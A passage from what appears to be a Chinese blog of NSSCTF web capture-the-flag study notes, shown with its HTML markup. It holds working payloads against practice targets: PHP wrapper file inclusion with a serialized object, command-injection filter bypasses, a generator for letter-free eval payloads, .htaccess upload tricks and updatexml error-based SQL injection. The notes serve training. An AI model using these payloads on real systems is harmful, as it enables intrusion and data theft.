class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];                <span class="comment"># GET方式传参</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];                <span class="comment"># GET方式传参</span></span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];        <span class="comment"># GET方式传参</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line"><span class="comment"># 如果text存在，且对file_get_contents进行了绕过(方法见441)</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="comment"># 输出</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="comment"># ???这函数啥</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="comment"># password为经过序列化之后的字串</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;来吧，学习一下preg_match()，以下是结合文心一言的信息</p><p>&emsp;&emsp;<strong>int preg_match ( string pattern , string subject [, array &amp;matches [, int flags &#x3D; 0 [, int $offset &#x3D; 0 ]]] )</strong>，用于字符串的匹配，匹配成功返回1，失败返回0，错误返回false</p><table><thead><tr><th>参数</th><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>pattern</td><td>string</td><td>要搜索的模式，即正则表达式。这个字符串必须是一个有效的正则表达式，否则 preg_match() 会返回 FALSE 并可能产生一个警告（取决于错误处理设置）</td></tr><tr><td>subject</td><td>string</td><td>要进行搜索的字符串</td></tr><tr><td>matches</td><td>array</td><td>如果提供了这个参数，并且匹配成功，它将被填充为包含结果的数组。第一个元素（matches[0]）将包含整个匹配到的字符串，随后的元素是捕获的子模式匹配结果</td></tr><tr><td>flags</td><td>int</td><td>这个参数可以设置为 PREG_OFFSET_CAPTURE，这样 matches 数组中返回的每个匹配结果都会附加一个额外的元素，表示该匹配在 subject 字符串中的偏移量</td></tr><tr><td>offset</td><td>int</td><td>从 subject 字符串的哪个位置开始进行搜索。默认为 0，即从字符串的开头开始。如果 offset 大于字符串的长度，preg_match() 将返回 FALSE</td></tr></tbody></table><p>&emsp;&emsp;这下子明确了，开始对三个参数进行处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">text=data:<span class="comment">//tetx/plain,welcome to the zjctf</span></span><br><span class="line">file=php:<span class="comment">//filter/read=convert.base64-encode/resource=useless.php</span></span><br><span class="line">=&gt; 以下为Base64解码后的useless.php代码</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">=&gt; password=O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br><span class="line">整合为：</span><br><span class="line">/?text=data:<span class="comment">//tetx/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<strong>枯了，死活出不来，只好去看大佬的WriteUp；诶，也没啥不一样啊，步骤都对啊？哦，file&#x3D;useless.php才行啊？</strong></p><p>&emsp;&emsp;这下才出来flag了，不过我还是不理解这是为什么，留待日后解决；不过也要打个醒，<span style="background-color: yellow;">不是啥参数都是PHP伪协议</span></p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/22_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="22_结果展示"></p><h2 id="1096-GXYCTF-2019-Ping-Ping-Ping-–ping命令注入-–空格绕过-–flag字串绕过"><a href="#1096-GXYCTF-2019-Ping-Ping-Ping-–ping命令注入-–空格绕过-–flag字串绕过" class="headerlink" title="1096_[GXYCTF 2019]Ping Ping Ping –ping命令注入 –空格绕过 –flag字串绕过"></a>1096_[GXYCTF 2019]Ping Ping Ping –ping命令注入 –空格绕过 –flag字串绕过</h2><p>&emsp;进入环境，霍，刚学，见3873，直接<code>127.0.0.1;</code>后跟shell语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;pwd                        # /var/www/html</span><br><span class="line">;ls /                       # 1fxck your symbol!</span><br><span class="line">;ls                         # flag.php index.php</span><br></pre></td></tr></table></figure><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/1096_%E5%88%9D%E6%AD%A5%E5%B0%9D%E8%AF%95.png" title="1096_初步尝试"></p><p>&emsp;&emsp;到这里就很刻意了，代码将空格放入了黑名单，而flag.php也在当前目录中，于是想办法绕过空格符即可，直接<code>cat&lt;flag.php</code></p><p>&emsp;&emsp;好吧不止有空格在黑名单中，cat、&lt;、或者flag也在，试试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;ls&lt;/                       <span class="comment"># 空</span></span><br><span class="line">;flag                       <span class="comment"># fxck your flag!</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;根据上述尝试，应该是flag被监测了，查找在shell语句中空格的绕过方法</p><table><thead><tr><th align="center"><code>$IFS$</code></th><th align="center"><code>$IFS$6</code>(其他数字亦可)</th><th align="center"><code>$&#123;IFS&#125; </code></th><th align="center"><code>&lt;</code></th><th align="center"><code>&lt;&gt;</code></th><th align="center"><code>%20(space)</code></th><th align="center"><code>%09(Tab)</code></th></tr></thead></table><p>&emsp;&emsp;对上述一一尝试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">echo</span>&lt;hello</span><br><span class="line">:<span class="keyword">echo</span>&lt;&gt;hello</span><br><span class="line">;<span class="keyword">echo</span>$IFS<span class="variable">$hello</span>        <span class="comment"># OK</span></span><br><span class="line">;<span class="keyword">echo</span>$IFS$<span class="number">6</span>hello      <span class="comment"># OK</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;行，就用<code>$IFS</code>，接下来是flag，不过注意到除了flag还有一个index.php，<code>cat$IFS$index.php</code>康康它，得到黑名单</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/1096_index%E6%9F%A5%E7%9C%8B.png" title="1096_index查看"></p><p>&emsp;&emsp;问题还是回归到如何绕过flag字串，这里学习到了两种好用的方法</p><table><thead><tr><th align="center">代码</th><th align="center">原理</th></tr></thead><tbody><tr><td align="center">;cat$IFS$1`ls&#96;</td><td align="center">Linux会先执行反引号下面的语句，并将执行结果返回原式继续运行</td></tr><tr><td align="center">;a&#x3D;f;cat$IFS$$alag.php</td><td align="center">字符拼接，先定义字符变量a，再在命令中使用$a代替f</td></tr></tbody></table><p>&emsp;&emsp;这里取第一种(<strong>注意，这里必须使用带数字的空格替换方式，否则不会出现flag</strong>)作为演示，flag如下</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/1096_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="1096_结果展示"></p><h2 id="439-SWPUCTF-2021-新生赛-hardrce-–命令执行函数-–preg-match-绕过-–URL取反绕过"><a href="#439-SWPUCTF-2021-新生赛-hardrce-–命令执行函数-–preg-match-绕过-–URL取反绕过" class="headerlink" title="439_[SWPUCTF 2021 新生赛]hardrce –命令执行函数 –preg_match()绕过 –URL取反绕过"></a>439_[SWPUCTF 2021 新生赛]hardrce –命令执行函数 –preg_match()绕过 –URL取反绕过</h2><p>&emsp;&emsp;进入环境得到PHP代码，审计得到flag’的要求如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># GET方式传入参数wllm</span></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line"><span class="comment"># 字符绕过</span></span><br><span class="line"><span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line"><span class="comment"># 不能用字母</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>);</span><br><span class="line"><span class="comment"># 命令执行函数</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;这个不能用字母太伤了点，第一时间想到的不应该是满足要求，而是如何绕过，以下为搜索到的preg_match()的常用绕过方法</p><table><thead><tr><th align="center">方式</th><th align="center">做法</th></tr></thead><tbody><tr><td align="center">数组绕过</td><td align="center">即令传入的参数为数组：wllm[]&#x3D;~~</td></tr><tr><td align="center">利用PCRE回溯次数限制绕过</td><td align="center">preg_match()的回溯次数默认为1000000次，采用函数str_repeat()强行输入同一字串多次</td></tr><tr><td align="center">换行符绕过</td><td align="center">在参数前面添加换行符%0a：wllm&#x3D;%0a~~</td></tr></tbody></table><p>&emsp;&emsp;由于blacklist中将换行符<code>\n</code>包含，故尝试前两种方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?wllm[]=<span class="number">123</span>                               <span class="comment"># NoVic4说：不错哦小伙子，可你能拿到flag吗？</span></span><br><span class="line">/?wllm=<span class="title function_ invoke__">str_repeat</span>(%<span class="number">27</span>a%<span class="number">27</span>,<span class="number">10000000</span>)        <span class="comment"># Ra&#x27;s Al Ghul说不能用字母哦！</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;测试出实际可行的方法为数组绕过，但是eval()函数只接受字符串做参数，故还是需要想办法满足其全部要求</p><p>&emsp;&emsp;经查询，对“无数字、字母”要求的参数输入，有以下几种：取反、异或、自增，有些操作其实PHP代码会跟简单，但谁叫我喜欢Python呢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 取反</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">return_backcode</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="comment"># 将字符串转换为字节</span></span><br><span class="line">    bytes_s = s.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="comment"># 创建一个新的bytes对象来存储按位取反后的结果</span></span><br><span class="line">    <span class="built_in">bytes</span> = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="comment"># 对每个字节进行按位取反，并添加到bytes中</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> bytes_s:</span><br><span class="line">        byte = ~byte &amp; <span class="number">0xFF</span>  <span class="comment"># 按位取反并转换为无符号8位整数</span></span><br><span class="line">        <span class="built_in">bytes</span>.append(byte)</span><br><span class="line">    <span class="comment"># 将按位取反后的字节的十六进制表示编码为URL格式</span></span><br><span class="line">    urlencoded_hex = urllib.parse.quote_plus(<span class="built_in">bytes</span>.<span class="built_in">hex</span>())</span><br><span class="line">    urlencoded_hex =urlencoded_hex.upper()</span><br><span class="line">    <span class="comment"># 转化为最终格式</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(urlencoded_hex):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            result.append(<span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">        result.append(char)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"><span class="comment"># 这里对格式进行了硬编码，必须满足~1(&quot;~2&quot;)的格式，比如system(&quot;pwd&quot;)</span></span><br><span class="line">sample = <span class="built_in">input</span>(<span class="string">&quot;请输入参数：&quot;</span>).strip()</span><br><span class="line">deals = sample.split(<span class="string">&#x27;(&quot;&#x27;</span>)</span><br><span class="line">deals[<span class="number">1</span>] = deals[<span class="number">1</span>][<span class="number">0</span>:<span class="built_in">len</span>(deals[<span class="number">1</span>])-<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(deals)</span><br><span class="line">end = <span class="string">&quot;(~&quot;</span>+return_backcode(deals[<span class="number">0</span>])+<span class="string">&quot;)(~&quot;</span>+return_backcode(deals[<span class="number">1</span>])+<span class="string">&#x27;);&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(end)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;这个一写完就已经不想动了，直接拿<code>system(&quot;pwd&quot;)</code>试了试，成功！其他的两个就容我下次再学吧(‘-‘*ゞ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;ls /&quot;</span>)</span><br><span class="line"><span class="comment"># 返回：bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;一如既往的单纯呐，直接<code>system(&quot;cat /flllllaaaaaaggggggg&quot;)</code>就出来了</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/439_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="439_结果展示"></p><h2 id="436-SWPUCTF-2021-新生赛-easyupload3-0-–文件上传-–-htaccess-–有问题尚未解决"><a href="#436-SWPUCTF-2021-新生赛-easyupload3-0-–文件上传-–-htaccess-–有问题尚未解决" class="headerlink" title="436_[SWPUCTF 2021 新生赛]easyupload3.0 –文件上传 –.htaccess –有问题尚未解决"></a>436_[SWPUCTF 2021 新生赛]easyupload3.0 –文件上传 –.htaccess –有问题尚未解决</h2><p>&emsp;&emsp;进入环境，发现标签页的提示让我看不懂了，再去查一下文件上传漏洞，发现能够契合提示的上传方式</p><p>&emsp;&emsp;<strong>.htaccess</strong>：是Apache服务器中的一个配置文件，它负责相关目录下的网页配置；通过htaccess文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能；启动.htaccess，需要在服务器的主配置文件中将AllowOverride设置为All；以下为搜索到的.htaccess文件常见的使用方法</p><table><thead><tr><th align="center">功能描述</th><th align="center"><code>.htaccess</code>配置示例</th></tr></thead><tbody><tr><td align="center">重定向URL</td><td align="center"><code>Redirect 301 /old-page.html /new-page.html</code></td></tr><tr><td align="center">URL重写</td><td align="center"><code>RewriteEngine On&lt;br&gt;RewriteRule ^products/([0-9]+)$ product.php?id=$1</code></td></tr><tr><td align="center">禁止访问文件或目录</td><td align="center"><code>Deny from all</code></td></tr><tr><td align="center">自定义错误页面</td><td align="center"><code>ErrorDocument 404 /error404.html</code></td></tr><tr><td align="center">访问权限控制</td><td align="center"><code>Order deny,allow&lt;br&gt;Deny from all&lt;br&gt;Allow from 192.168.0.1</code></td></tr><tr><td align="center">设置默认文档</td><td align="center"><code>DirectoryIndex index.php index.html</code></td></tr><tr><td align="center">压缩文件</td><td align="center"><code>&lt;IfModule mod_deflate.c&gt;&lt;br&gt;AddOutputFilterByType DEFLATE text/html text/plain text/xml&lt;br&gt;&lt;/IfModule&gt;</code></td></tr><tr><td align="center">防止目录列表</td><td align="center"><code>Options -Indexes</code></td></tr><tr><td align="center">设置缓存</td><td align="center"><code>&lt;IfModule mod_expires.c&gt;&lt;br&gt;ExpiresActive On&lt;br&gt;ExpiresDefault &quot;access plus 1 week&quot;&lt;br&gt;&lt;/IfModule&gt;</code></td></tr><tr><td align="center">强制使用HTTPS</td><td align="center"><code>RewriteEngine On&lt;br&gt;RewriteCond %&#123;HTTPS&#125; off&lt;br&gt;RewriteRule ^(.*)$ https://%&#123;HTTP_HOST&#125;%&#123;REQUEST_URI&#125; [L,R=301]</code></td></tr><tr><td align="center">配置HTTP身份验证</td><td align="center"><code>AuthType Basic&lt;br&gt;AuthName &quot;Restricted Area&quot;&lt;br&gt;AuthUserFile /path/to/.htpasswd&lt;br&gt;Require valid-user</code></td></tr><tr><td align="center">设置PHP配置</td><td align="center"><code>php_value upload_max_filesize 10M&lt;br&gt;php_value memory_limit 256M</code></td></tr><tr><td align="center">定义自定义错误页面</td><td align="center"><code>ErrorDocument 404 /404.html&lt;br&gt;ErrorDocument 500 /500.html</code></td></tr><tr><td align="center">禁止特定文件类型</td><td align="center">&#96;&lt;FilesMatch “.(php</td></tr><tr><td align="center">设置响应头信息</td><td align="center"><code>&lt;IfModule mod_headers.c&gt;&lt;br&gt;Header set Cache-Control &quot;no-cache, no-store, must-revalidate&quot;&lt;br&gt;Header set Access-Control-Allow-Origin &quot;*&quot;&lt;br&gt;&lt;/IfModule&gt;</code></td></tr><tr><td align="center">配置URL重定向规则</td><td align="center"><code>RewriteEngine On&lt;br&gt;RewriteRule ^news/([0-9]+)/?$ article.php?id=$1 [L]</code></td></tr><tr><td align="center">设置URL重定向和查询字符串处理</td><td align="center"><code>RewriteEngine On&lt;br&gt;&lt;br&gt;# Redirect &quot;/about&quot; to &quot;/pages/about&quot;&lt;br&gt;RewriteRule ^about$ /pages/about [L,R=301]&lt;br&gt;&lt;br&gt;# Rewrite &quot;/product?id=123&quot; to &quot;/product/123&quot;&lt;br&gt;RewriteCond %&#123;QUERY_STRING&#125; ^id=(\d+)$&lt;br&gt;RewriteRule ^product$ /product/%1 [L,R=301]</code></td></tr><tr><td align="center">自定义目录索引</td><td align="center"><code>Options +Indexes&lt;br&gt;IndexOptions FancyIndexing</code></td></tr></tbody></table><p>&emsp;&emsp;上述仅为知识普及，这里才是解题需要学习的.htaccess的编写，先传一个.php文件试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;shangchuan.php&quot;                   # 被挡</span><br><span class="line">filename=&quot;shangchuan.phtml&quot;                 # 被挡</span><br><span class="line">filename=&quot;shangchuan.jpg&quot;                   # 通过，展示为图片</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;初步认为网页只允许.jpg后缀的文件上传，于是创建.htaccess文件并实现.jpg文件以.php脚本的方式运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;436_shangchuan.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FileMatch&gt;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;于是先上传.htaccess文件，退回后再上传.jpg文件，？？？</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/436_%E5%87%BA%E9%94%99%E5%B1%95%E7%A4%BA.png" title="436_出错展示"></p><p>&emsp;&emsp;回过头看佬们的WriteUp，也是一样的啊，我还是没找出来哪里的错</p><p>&emsp;&emsp;又试了一次，这次又不一样了，是我没有绕过去嘛，，，</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/436_%E6%8B%A6%E6%88%AA%E5%B1%95%E7%A4%BA.png" title="436_拦截展示"></p><h2 id="428-SWPUCTF-2021-新生赛-error-–SQL注入-–报错注入-–flag分段显示"><a href="#428-SWPUCTF-2021-新生赛-error-–SQL注入-–报错注入-–flag分段显示" class="headerlink" title="428_[SWPUCTF 2021 新生赛]error –SQL注入 –报错注入 –flag分段显示"></a>428_[SWPUCTF 2021 新生赛]error –SQL注入 –报错注入 –flag分段显示</h2><p>&emsp;&emsp;进入环境，尝试向框中输入随机字符乱码，出现提示</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/428_SQL%E6%8F%90%E7%A4%BA.png" title="428_SQL提示"></p><p>&emsp;&emsp;明确是SQL注入知识点，按照19记载的各种类型进行尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2-1                              # 2-1</span><br><span class="line">1&#x27; and 1=1                       # 没用</span><br><span class="line">1&#x27; order by 1 --+                # 没用</span><br><span class="line">1;select 1,2                     # 没用</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;很显然二次注入也不能是，只能是报错注入了，查了查报错注入的常用语句及函数</p><table><thead><tr><th align="center">函数</th><th>参数释义</th></tr></thead><tbody><tr><td align="center"><code>updatexml(XML_document, XPath_string,new_value);</code></td><td>XML_document：String格式，为XML文档对象的名称<br/>XPath_string：Xpath语法的查询语句<br/>new_value：String格式，替换查找到的数据</td></tr><tr><td align="center"><code>extractValue(XML_document, XPath_string);</code></td><td>XML_document：String格式，为XML文档对象的名称<br/>XPath_string：Xpath语法的查询语句</td></tr></tbody></table><p>&emsp;&emsp;先尝试使用函数updatexml()，由于需要使其报错、不修改原有数据库且随报错输出查询语句的结果，故参数1、3应当被忽略，以1代替；而为了能很好的在报错信息中找到关键输出，会使用concat函数以两个特殊符号将查询结果包围</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 爆数据库</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#           =&gt; test_db</span><br><span class="line">// 爆表名</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;test_db&#x27;),0x7e),1)#                                      =&gt; test_tb users</span><br><span class="line">// 爆字段名</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;test_db&#x27; and table_name=&#x27;test_tb&#x27;),0x7e),1)#             =&gt; id flag</span><br><span class="line">// 爆flag</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select flag from test_tb),0x7e),1)#    =&gt;NSSCTF&#123;b54f13c8-a82f-48a6-85ad</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;明显出现问题，flag只爆了一半出来，查阅得知原因是因为flag过长导致无法显示完全，使用substr()函数可以解决</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">substr((select flag from test_tb),21,40)           // 查询flag字段，查询范围为第21~40个字符</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,substr((select flag from test_tb),21,40),0x7e),1)#</span><br><span class="line">=&gt; -48a6-85ad-16550bc50df6&#125;</span><br><span class="line">// 整合后应如下：NSSCTF&#123;b54f13c8-a82f-48a6-85ad-16550bc50df6&#125;</span><br></pre></td></tr></table></figure><h2 id="3871-LitCTF-2023-1zjs-–JSFuck加密"><a href="#3871-LitCTF-2023-1zjs-–JSFuck加密" class="headerlink" title="3871_[LitCTF 2023]1zjs –JSFuck加密"></a>3871_[LitCTF 2023]1zjs –JSFuck加密</h2><p>&emsp;&emsp;进入环境，又是巨多JS源码中找flag，不过这次下手轻了点，不需要往下翻就能看到</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3871_%E5%85%B3%E9%94%AE%E6%8F%90%E7%A4%BA.png" title="3871_关键提示"></p><p>&emsp;&emsp;进入提示文件，(* ￣︿￣)这是啥，问了文心一言，叫做JSFuck加密，解密只需要把密文复制后放到控制台console中输出即可</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3871_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="3871_结果展示"></p><h2 id="2640-SWPUCTF-2022-新生赛-ez-ez-php-–PHP伪协议-–文件包含漏洞"><a href="#2640-SWPUCTF-2022-新生赛-ez-ez-php-–PHP伪协议-–文件包含漏洞" class="headerlink" title="2640_[SWPUCTF 2022 新生赛]ez_ez_php –PHP伪协议 –文件包含漏洞"></a>2640_[SWPUCTF 2022 新生赛]ez_ez_php –PHP伪协议 –文件包含漏洞</h2><p>&emsp;&emsp;进入环境得到PHP代码，审计代码发现如下关键处</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># GET方式传入参数</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line"><span class="comment"># 参数file的前三个字符须为“php”</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">3</span>) === <span class="string">&quot;php&quot;</span> )</span><br><span class="line"><span class="comment"># 文件包含</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="comment"># 关键文件提示</span></span><br><span class="line"><span 